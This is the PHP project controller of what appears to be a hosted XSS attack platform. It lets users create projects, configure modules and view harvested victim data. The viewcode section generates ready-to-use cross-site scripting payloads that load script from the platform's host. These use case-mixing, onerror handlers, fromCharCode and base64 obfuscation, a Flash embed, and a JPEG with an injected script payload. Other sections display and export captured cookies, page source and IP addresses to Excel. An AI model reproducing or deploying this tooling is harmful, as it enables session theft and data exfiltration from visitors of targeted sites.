<?php
/**
 * project.php 项目
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
if(!defined('IN_OLDCMS')) die('Access Denied');
if($user->userId<=0) $user->ToLogin();

$act=Val('act','GET');
switch($act){
	case 'create':
		include_once(ROOT_PATH.'/source/common.php');
		$countSql = $db->FirstValue("SELECT COUNT(*) FROM ".Tb('project')." WHERE userId='".$user->userId."'");
		if($user->huiyuan != 1){
			if($countSql>2) ShowError('您是普通会员只能创建3个项目！请修改或删除您原来的项目。');
		}
		$smarty=InitSmarty();
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('projects',$projects);
		$smarty->assign('modules',$modules);
		$smarty->display('project_create.html');
		break;
	case 'create_submit':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$title=Val('title','POST');
		$description=Val('description','POST');
		if(empty($title)) ShowError('项目名称不能为空',URL_ROOT.'/bdstatic.com/?callback=project&act=create');
		$db=DBConnect();
		$countSql = $db->FirstValue("SELECT COUNT(*) FROM ".Tb('project')." WHERE userId='".$user->userId."'");
		if($user->huiyuan != 1){
			if($countSql>2) ShowError('您是普通会员只能创建3个项目！请修改或删除您原来的项目。');
		}
		if($countSql>4 && $user->adminLevel<=0){
			ShowError('每个用户最多只能创建5个项目！请修改或删除您原来的项目。');
		}
		//生成短网址字符
		$existedStrs=$db->FirstColumn("SELECT urlKey FROM ".Tb('project')."");
		$urlKey=ShortUrlCode($existedStrs);
		//生成authCode
		$authCode=md5('xsser_'.$urlKey.'_'.$user->userId.'_'.time());
		$values=array(
			'title'=>$title,
			'description'=>$description,
			'userId'=>$user->userId,
			'urlKey'=>$urlKey,
			'authCode'=>$authCode,
			'addTime'=>time()
		);
		$db->AutoExecute(Tb('project'),$values);
		$projectId=$db->LastId();
		//ShowSuccess('创建成功');
		header("Location: ".URL_ROOT.'/bdstatic.com/?callback=project&act=setcode&ty=create&id='.$projectId);
		break;
	case 'setcode':
		$db=DBConnect();
		$id=Val('id','GET',1);
		$ty=Val('ty','GET');
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		//可使用的模块
		$modulesCan=$db->Dataset("SELECT * FROM ".Tb('module')." WHERE (isOpen=1 AND isAudit=1) OR userId='".$user->userId."'");
		//已使用的模块
		$moduleSetKeys=json_decode($project['moduleSetKeys'],true);
		$myModules=array();
		if(!empty($project['modules'])) $myModules=(array)json_decode($project['modules'],true);
		foreach($modulesCan as $k=>$v){
			$modulesCan[$k]['keys']=(array)json_decode($v['keys'],true);
			$modulesCan[$k]['keys']=implode(',',$modulesCan[$k]['keys']);
			if(in_array($v['id'],$myModules)) $modulesCan[$k]['choosed']=1;
			//是否有要配置的参数
			if(!empty($v['setkeys'])){
				$setkeysK=(array)json_decode($v['setkeys'],true);
				$setkeys=array();
				foreach($setkeysK as $kv){
					$kRow['key']=$kv;
					if(!empty($moduleSetKeys["setkey_{$v['id']}_{$kv}"])) $kRow['value']=urldecode($moduleSetKeys["setkey_{$v['id']}_{$kv}"]);
					$setkeys[]=$kRow;
				}
				$modulesCan[$k]['setkeys']=$setkeys;
			}
		}
		include_once(ROOT_PATH.'/source/common.php');
		$smarty=InitSmarty();
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('project',$project);
		$smarty->assign('modulesCan',$modulesCan);
		$smarty->assign('projects',$projects);
		$smarty->assign('modules',$modules);
		$smarty->assign('ty',$ty);
		$smarty->display('project_setcode.html');
		break;
	case 'setcode_submit':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$id=Val('id','POST',1);
		$ty=Val('ty','POST');
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		//模块
		$modules=Val('modules','POST',1,1);
		$code=Val('code','POST');
		$values=array(
			'code'=>$code
		);
		if(!empty($modules)){
			$values['modules']=JsonEncode($modules);
			$moduleSetKeys=array();
			//配置的参数
			foreach($modules as $mId){
				if(intval($mId) == 1){
					$setkeypd="setkey_1_keepsession";
					$setkeypd=Val($setkeypd,'POST',1);
					$keeps = array();
					if($setkeypd == 1){
						$keeps=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project')." WHERE userId='".$user->userId."' and `moduleSetKeys` LIKE  '%setkey_1_keepsession\":\"1%' ");
						if($keeps >1  && $user->adminLevel<=0 ) ShowError('为节省资源，每位用户仅允许“一个项目”的“默认模块”拥有持久化cookie保持功能！！！若要此项目拥有持久保持功能，请关闭其他项目“默认模块”的持久功能。');
					}
				}
				if($user->huiyuan != 1 && ($mId == 19 || $mId == 51|| $mId == 31|| $mId == 48|| $mId == 35)){  //限制插件使用，某些插件仅允许会员使用。
					ShowError('您是普通会员无法使用此插件，此插件仅限赞助会员使用。');
				}
				$module=$db->FirstRow("SELECT * FROM ".Tb('module')." WHERE id='{$mId}'");
				if(!empty($module) && !empty($module['setkeys'])){     
					$mSetKeys=(array)json_decode($module['setkeys'],true);
					foreach($mSetKeys as $setkey){
						$setkeyK="setkey_{$mId}_{$setkey}";
						$setkeyV=Val($setkeyK,'POST');
						if(!empty($setkeyV)){
							$setkeyV=urlencode($setkeyV);
							$moduleSetKeys["$setkeyK"] = $setkeyV;
						} 
					}
				}
			}
			$values['moduleSetKeys']=JsonEncode($moduleSetKeys);
		}
		$db->AutoExecute(Tb('project'),$values,'UPDATE'," id='{$id}'");
		if($ty=='create'){
			header("Location: ".URL_ROOT.'/bdstatic.com/?callback=project&act=viewcode&ty=create&id='.$id);
		}else{
			ShowSuccess('操作成功');
		}
		break;
	case 'view':
		$id=Val('id','GET',1);
		$pNO=Val('pNO','GET',1);
		if(empty($pNO)) $pNO=0;
		//$page_size=10;
		//$sub_pages=10;
		$db=DBConnect();
		$db->Execute("UPDATE ".Tb('keep_sessions')." SET ks_start=0 WHERE ks_userid='".$user->userId."' and ks_project={$id} ");
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		$domain=Val('domain','GET');
		$where=' AND allowdel=1 ';
		$href = URL_ROOT."/bdstatic.com/?callback=project&act=view&id={$id}";
		if(!empty($domain)){
			$where.=" AND domain='{$domain}'";
			$href = URL_ROOT."/bdstatic.com/?callback=project&act=view&id={$id}&domain={$domain}";
		}			
		$domains=array(); //域名列表
		//读取项目获取的内容
		$sql = "SELECT id,projectId,serverContent,content,domain,addTime FROM ".Tb('project_content')." WHERE projectId='{$id}' {$where} ORDER BY id DESC";
		$countSql = "SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$id}' {$where} ORDER BY id DESC";
		include(ROOT_PATH.'/source/class/Pager.class.php');
		$connts = new Pager($countSql, $sql, $href,$pRN=20,$pNavRN=5,$pNO);
		$pagers = $connts->nav;
		$contents = $connts->data;
		$pages = $connts->pSum;
		foreach($contents as $k=>$v){
			$contents[$k]['content']=json_decode($v['content']);
			if(empty($contents[$k]['content'])) $contents[$k]['content']=StripStr($v['content']);
			$contents[$k]['serverContent']=json_decode($v['serverContent']);
			$contents[$k]['serverContent']=array_map('StripStr',(array)$contents[$k]['serverContent']);
			if(!empty($contents[$k]['serverContent']['IP-ADDR'])){
				$contents[$k]['serverContent']['IP-ADDR'] = urldecode($contents[$k]['serverContent']['IP-ADDR']);
			}
			if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==411161555){
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息图片XSS获取</a>";
			}else if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==1){
				//$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie); 双解码cookie导致XSS
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息表单插件获取</a>";
			}else if(isset($contents[$k]['content']->title) || isset($contents[$k]['content']->plugins) || isset($contents[$k]['content']->htmlyuanma)){
				if(isset($contents[$k]['content']->title)){
					$contents[$k]['content']->title = urldecode($contents[$k]['content']->title);
				}
				if(isset($contents[$k]['content']->plugins)){
					$contents[$k]['content']->plugins = urldecode($contents[$k]['content']->plugins);
				}
				if(isset($contents[$k]['content']->htmlyuanma)){
					$contents[$k]['content']->htmlyuanma = "<textarea title=\"右下角可随意拖动窗口，需自己补全HTML源码中的完整URL地址(例如JS、图片等加载地址)。\" class=\"form-control base-textara\" readonly style=\"margin: 0px; width: 240px; height: 185px;\">".urldecode($contents[$k]['content']->htmlyuanma)."</textarea>";
				}
			}else if(isset($contents[$k]['content']->datastorage)){
				$contents[$k]['content']->datastorage = urldecode($contents[$k]['content']->datastorage);
			}
			if(isset($contents[$k]['content']->cookie)){
				$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie);
			}
		    if(isset($contents[$k]['content']->screenshotpic)){
		        $contents[$k]['content']->screenshotpic = urldecode($contents[$k]['content']->screenshotpic);
		    }
		}
		$domainss=$db->Dataset("select distinct domain from ".Tb('project_content')." WHERE projectId='{$id}' {$where} ORDER BY id DESC");
		if($domainss){
			foreach($domainss as $k=>$v){
				if(!empty($v['domain']) && !in_array($v['domain'],$domains)) $domains[]=$v['domain'];
			}
		}
		include_once(ROOT_PATH.'/source/common.php');
		$smarty=InitSmarty();
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('project',$project);
		$smarty->assign('contents',$contents);
		$smarty->assign('pagers',$pagers);
		$smarty->assign('pages',$pages);
		$smarty->assign('domain',$domain);
		$smarty->assign('domains',$domains);
		$smarty->assign('projects',$projects);
		$smarty->assign('modules',$modules);
		//$smarty->assign('subPages',$subPages);
		$smarty->display('project_view.html');
		break;
	case 'viewcode':
		$id=Val('id','GET',1);
		//s$ty=Val('ty','GET');
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		$code='';
		$moduleSetKeys=json_decode($project['moduleSetKeys'],true);
		/* 模块 begin */
		$moduleIds=array();
		if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);
		if(!empty($moduleIds)){
			$modulesStr=implode(',',$moduleIds);
			$modules=$db->Dataset("SELECT * FROM ".Tb('module')." WHERE id IN ($modulesStr)");
			if(!empty($modules)){
				foreach($modules as $module){
					$module['code']=str_replace('{projectId}',$project['urlKey'],$module['code']);
					//module里是否有配置的参数
					if(!empty($module['setkeys'])){
						$setkeys=json_decode($module['setkeys'],true);
						foreach($setkeys as $setkey){
							if(!empty($moduleSetKeys["setkey_{$module['id']}_{$setkey}"])){
								$module['code']=str_replace('{set.'.$setkey.'}',urldecode($moduleSetKeys["setkey_{$module['id']}_{$setkey}"]),$module['code']);
							}
						}
					}
					$code.=$module['code'];
				}	
			}
		}
		/* 模块 end */
		/* 项目自定义代码 */
		$codeurl=URL_PROJECT."/{$project['urlKey']}";
		$code.=$project['code'];

		
    	//转短地址
		$longUrl=URL_PROJECT."/".$project['urlKey'];
		$nothttpurl = str_replace('http://','',$longUrl);
		$nothttpurl = str_replace('https://','',$nothttpurl);
		$scriptShow1=StripStr("</tExtArEa>'\"><sCRiPt sRC=//".$nothttpurl."></sCrIpT>");
		$shortShow3=StripStr("<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='//{$nothttpurl }';>");
		$shortShow4=StripStr("<img src=\"\" onerror=\"document.write(String.fromCharCode(".implode(',',unpack("C*", '<sCRiPt sRC=//'.$nothttpurl.'></sCrIpT>'))."))\">");
		$shortShow5=StripStr('<embed src='.URL_PROJECT.'/liuyan/xs.swf?a=e&c=doc\\u0075ment.write(St\\u0072ing.from\\u0043harCode('.implode(',',unpack("C*", "<sCRiPt sRC=//".$nothttpurl."></sCrIpT>")).')) allowscriptaccess=always type=application/x-shockwave-flash></embed>');
		$jixiandaima=StripStr("<sCRiPt/SrC=//".$nothttpurl.">");
		$img2=StripStr("<Img sRC=//".$nothttpurl."/test.jpg>");
		$img1=StripStr("<Img srC=$codeurl/test.jpg> or <Img srC=\"$codeurl/test.jpg\">");
		$code2='var b=document.createElement("script");b.src="'.$longUrl.'"+Math.random();(document.getElementsByTagName("HEAD")[0]||document.body).appendChild(b);';
		$scriptShow2=StripStr("</tEXtArEa>'\"><img src=# id=xssyou style=display:none onerror=eval(unescape(/".rawurlencode($code2)."/.source));//>");
		//新增XSS代码
		$xinzeng1 = StripStr("'\"><input onfocus=eval(atob(this.id)) id=".base64_encode("var a=document.createElement(\"script\");a.src=\"https://$nothttpurl\";document.body.appendChild(a);")." autofocus>");
		$xinzeng2 = StripStr("'\"><img src=x id=".base64_encode("var a=document.createElement(\"script\");a.src=\"https://$nothttpurl\";document.body.appendChild(a);")." onerror=eval(atob(this.id))>");
		
		
		//图片XSS2 自动生成模块开始
		$basedir = "/themes/picxss/";
		$picxssurl = $basedir.md5($project['urlKey']."picxss".$user->userId).".jpg";
		$picxssname = dirname(dirname(__FILE__)).$picxssurl;
		$picxssprint = "";
		$sfcg = FALSE;
		if(!file_exists($picxssname)){
			include_once(ROOT_PATH.'/source/class/Imagexss.class.php');
			$miniPayload = "</tExtArEa>'\"><sCRiPt sRC=//".$nothttpurl."></sCrIpT>";
			$gj = dirname(dirname(__FILE__))."/test.jpg/5.jpg";
			if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
				ShowError('php-gd is not installed，请联系管理员。');
			}
			if(!isset($gj)) {
				ShowError('调用图片文件不存在，出现错误！请联系管理员。');
			}
			//set_error_handler("custom_error_handler");
			for($pad = 0; $pad < 1024; $pad++) {
				$nullbytePayloadSize = $pad;
				$dis = new DataInputStream($gj);
				$outStream = file_get_contents($gj);
				$extraBytes = 0;
				$correctImage = TRUE;

				if($dis->readShort() != 0xFFD8) {
					ShowError('Incorrect SOI marker，请联系管理员。');
				}

				while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
					$marker = $dis->readByte();
					$size = $dis->readShort() - 2;
					$dis->skip($size);
					if($marker === 0xDA) {
						$startPos = $dis->seek();
						$outStreamTmp = 
							substr($outStream, 0, $startPos) . 
							$miniPayload . 
							str_repeat("\0",$nullbytePayloadSize) . 
							substr($outStream, $startPos);
						checkImage('_'.$gj, $outStreamTmp, TRUE);
						if($extraBytes !== 0) {
							while((!$dis->eof())) {
								if($dis->readByte() === 0xFF) {
									if($dis->readByte !== 0x00) {
										break;
									}
								}
							}
							$stopPos = $dis->seek() - 2;
							$imageStreamSize = $stopPos - $startPos;
							$outStream = 
								substr($outStream, 0, $startPos) . 
								$miniPayload . 
								substr(
									str_repeat("\0",$nullbytePayloadSize).
										substr($outStream, $startPos, $imageStreamSize),
									0,
									$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
										substr($outStream, $stopPos);
						} elseif($correctImage) {
							$outStream = $outStreamTmp;
						} else {
							break;
						}
						if(checkImage($picxssname, $outStream)) {
							$picxssprint = "<img src='{$picxssurl}' style='width:122px;height:150px;' title='可右键保存此文件到本地，此图片文件已含有当前项目XSS代码，建议勾选[默认模块]使用。'>";
							$sfcg = TRUE;
							break 2; //成功生成，跳出循环。
						} else {
							break;
						}
					}
				}
			}
			if(!$sfcg){
				unlink($picxssname);
				ShowError('Something\'s wrong，请联系管理员。');
			}
		}else{
			$picxssprint = "<img src='{$picxssurl}' style='width:122px;height:150px;' title='可右键保存此文件到本地，此图片文件已含有当前项目XSS代码，建议勾选[默认模块]使用。'>";
		}
		
		include_once(ROOT_PATH.'/source/common.php');
		$smarty=InitSmarty();
		$smarty->assign('do',$do);
		$smarty->assign('show',$show);
		$smarty->assign('url',$url);
		$smarty->assign('project',$project);
		$smarty->assign('code',$code);
		$smarty->assign('codeurl',$codeurl);
		$smarty->assign('scriptShow1',$scriptShow1);
		$smarty->assign('scriptShow2',$scriptShow2);
		$smarty->assign('projects',$projects);
		$smarty->assign('modules',$modules);
		//$smarty->assign('ty',$ty);
		$smarty->assign('shortShow3',$shortShow3);
		$smarty->assign('shortShow4',$shortShow4);
		$smarty->assign('shortShow5',$shortShow5);
		$smarty->assign('jixiandaima',$jixiandaima);
		$smarty->assign('picxssprint',$picxssprint);
		$smarty->assign('xinzeng1',$xinzeng1);
		$smarty->assign('xinzeng2',$xinzeng2);
		$smarty->assign('img1',$img1);
		$smarty->assign('img2',$img2);
		$smarty->display('project_viewcode.html');
		break;
	case 'picxss':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$id=Val('id','POST');
		//图片中加入XSS code
		
		break;
	case 'delete':
		if(! $user->CheckToken(Val('token','GET'))) ShowError('操作失败');
		$id=Val('id','GET',1);
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		//删除相关的keepsession
		$db->Execute("DELETE FROM ".Tb('keepsession')." WHERE projectId='{$id}'");
		$db->Execute("DELETE FROM ".Tb('project')." WHERE id='{$id}'");
		ShowSuccess('操作成功');
		break;
	case 'delcontent':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$id=Val('id','POST');
		$db=DBConnect();
		$content=$db->FirstRow("SELECT pc.projectId FROM ".Tb('project_content')." pc INNER JOIN ".Tb('project')." p ON p.id=pc.projectId WHERE p.userId='".$user->userId."' AND pc.id='{$id}'");
		if(!empty($content)){
			$db->Execute("UPDATE ".Tb('project_content')." SET allowdel=0 WHERE id='{$id}'");
		}
		echo 1;
		break;
	case 'delcontents':
		if(! $user->CheckToken(Val('token','POST'))) ShowError('操作失败');
		$ids=Val('ids','POST');
		$ids=explode('|',$ids);
		//删除
		$db=DBConnect();
		foreach($ids as $id){
			$content=$db->FirstRow("SELECT pc.projectId FROM ".Tb('project_content')." pc INNER JOIN ".Tb('project')." p ON p.id=pc.projectId WHERE p.userId='".$user->userId."' AND pc.id='{$id}'");
			if(!empty($content)) $db->Execute("UPDATE ".Tb('project_content')." SET allowdel=0 WHERE id='{$id}'");
		}
		echo 1;
		break;
	case 'downexcel':
		$id=Val('id','GET',1);
		$db=DBConnect();
		$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE id='{$id}' AND userId='".$user->userId."'");
		if(empty($project)) ShowError('项目不存在或没有权限');
		$daytwo=$db->FirstRow("SELECT * FROM ".Tb('zhaohuipwd')." WHERE userid='".$user->userId."' AND pd=2 AND zhuser='{$id}' limit 1,1 ");
		if($daytwo['zhtime']){
				if(getdate($daytwo['zhtime'])['year']===getdate(time())['year'] && getdate($daytwo['zhtime'])['yday']===getdate(time())['yday']){
					ShowError("下载失败，一天之内只允许下载两次！");
					exit;
				}
			}
		$executeArr=array(
								'userid'=>$user->userId,
								'zhuser'=>$id,
								'zhpwd'=>$project['title'],
								'zhemail'=>$user->email,
								'zhtime'=>time(),
								'pd'=>2
								);
		$db->AutoExecute(Tb('zhaohuipwd'),$executeArr);
		$where=' AND allowdel=1 ';		
		$contents=$db->Dataset("SELECT id,projectId,serverContent,content,domain,addTime FROM ".Tb('project_content')." WHERE projectId='{$id}' {$where} ORDER BY id DESC");
		foreach($contents as $k=>$v){
			$contents[$k]['content']=json_decode($v['content']);
			if(empty($contents[$k]['content'])) $contents[$k]['content']=StripStr($v['content']);
			$contents[$k]['serverContent']=json_decode($v['serverContent']);
			$contents[$k]['serverContent']=array_map('StripStr',(array)$contents[$k]['serverContent']);
			if(!empty($contents[$k]['serverContent']['IP-ADDR'])){
				$contents[$k]['serverContent']['IP-ADDR'] = urldecode($contents[$k]['serverContent']['IP-ADDR']);
			}
			if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==411161555){
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息图片XSS获取</a>";
			}else if(!empty($contents[$k]['serverContent']['imgs']) && $contents[$k]['serverContent']['imgs']==1){
				//$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie); 双解码cookie导致XSS
				$contents[$k]['serverContent']['imgs'] = "<a style=\"color: #ff0000;\">本信息表单插件获取</a>";
			}else if(isset($contents[$k]['content']->title) || isset($contents[$k]['content']->plugins) || isset($contents[$k]['content']->htmlyuanma)){
				if(isset($contents[$k]['content']->title)){
					$contents[$k]['content']->title = urldecode($contents[$k]['content']->title);
				}
				if(isset($contents[$k]['content']->plugins)){
					$contents[$k]['content']->plugins = urldecode($contents[$k]['content']->plugins);
				}
				if(isset($contents[$k]['content']->htmlyuanma)){
					$contents[$k]['content']->htmlyuanma = "<textarea title=\"右下角可随意拖动窗口，需自己补全HTML源码中的完整URL地址(例如JS、图片等加载地址)。\" class=\"form-control base-textara\" readonly style=\"margin: 0px; width: 240px; height: 185px;\">".urldecode($contents[$k]['content']->htmlyuanma)."</textarea>";
				}
			}else if(isset($contents[$k]['content']->datastorage)){
				$contents[$k]['content']->datastorage = urldecode($contents[$k]['content']->datastorage);
			}
			if(isset($contents[$k]['content']->cookie)){
				$contents[$k]['content']->cookie = urldecode($contents[$k]['content']->cookie);
			}
		    if(isset($contents[$k]['content']->screenshotpic)){
		        $contents[$k]['content']->screenshotpic = urldecode($contents[$k]['content']->screenshotpic);
		    }
		}
		include('class/PHPExcel.class.php');
		//include 'class/PHPExcel/Writer/Excel2007.php';
		$objPHPExcel = new PHPExcel();
		$objPHPExcel->getProperties()->setCreator("ld8.me-Xss")
									 ->setLastModifiedBy(date("Y-m-d h:i", time()))
									 ->setTitle("ld8.me-Xss---".$project['title'])
									 ->setSubject("Office 2007 XLSX Xss Document")
									 ->setDescription("Xss document for Office 2007 XLSX, generated using PHP classes.")
									 ->setKeywords("office 2007 openxml php")
									 ->setCategory("Xss result file");
		$objPHPExcel->setActiveSheetIndex(0);
		$k = 0;
		//print_r()
		foreach($contents as $k=>$v){
				/* @func 设置列 */
				$contenttt = "";
				foreach($contents[$k]['content'] as $ck=>$c){
					$contenttt .= $ck.'：'.$c."\r\n";
				}
				$serverContenttt = "";
				foreach($contents[$k]['serverContent'] as $sk=>$s){
					$serverContenttt .= $sk.'：'.$s."\r\n";
				}
				$k = $k+1;
				$objPHPExcel->getActiveSheet()->SetCellValue('A'.$k, date("Y-m-d H:i", $contents[$k]['addTime'])."\r\n");
				$objPHPExcel->getActiveSheet()->getStyle('A'.$k)->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
				$objPHPExcel->getactivesheet()->setcellvalue('B'.$k, $contenttt);
				$objPHPExcel->getActiveSheet()->getStyle('B'.$k)->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
				$objPHPExcel->getactivesheet()->setcellvalue('C'.$k, $serverContenttt);
				$objPHPExcel->getActiveSheet()->getStyle('C'.$k)->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
				$objPHPExcel->getActiveSheet()->getRowDimension($k)->setRowHeight(30);
				
				
			}
		$objPHPExcel->getActiveSheet()->getColumnDimension('A')->setWidth(20);
		$objPHPExcel->getActiveSheet()->getColumnDimension('B')->setWidth(55);
		$objPHPExcel->getActiveSheet()->getColumnDimension('C')->setWidth(45);
		$objPHPExcel->getActiveSheet()->getStyle('C')->getAlignment()->setVertical(PHPExcel_Style_Alignment::VERTICAL_CENTER);
		$objPHPExcel->getActiveSheet()->setTitle('gdd-gdd-xss');
		$objPHPExcel->setActiveSheetIndex(0);
		//print_r($objPHPExcel);exit;
		//header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
		header("Content-type: application/vnd.ms-excel"); 
		//header("Content-type: application/octet-stream;charset=utf-8");
		header('Content-Disposition: attachment;filename="gdd-gd-xssdown.xlsx"');
		header('Cache-Control: max-age=0');
		// If you're serving to IE 9, then the following may be needed
		header('Cache-Control: max-age=1');
		// If you're serving to IE over SSL, then the following may be needed
		header ('Expires: 0'); // Date in the past
		//header ('Last-Modified: '.gmdate('D, d M Y H:i:s').' GMT'); // always modified
		header ('Cache-Control: must-revalidate,post-check=0,pre-check=0');
		header ('Pragma: public'); // HTTP/1.0
		$objWriter = PHPExcel_IOFactory::createWriter($objPHPExcel, 'Excel2007');
		$objWriter->save('php://output');
		exit;
		break;
	default:
		ShowError('操作失败，请指定参数谢谢。');
		break;
}
?>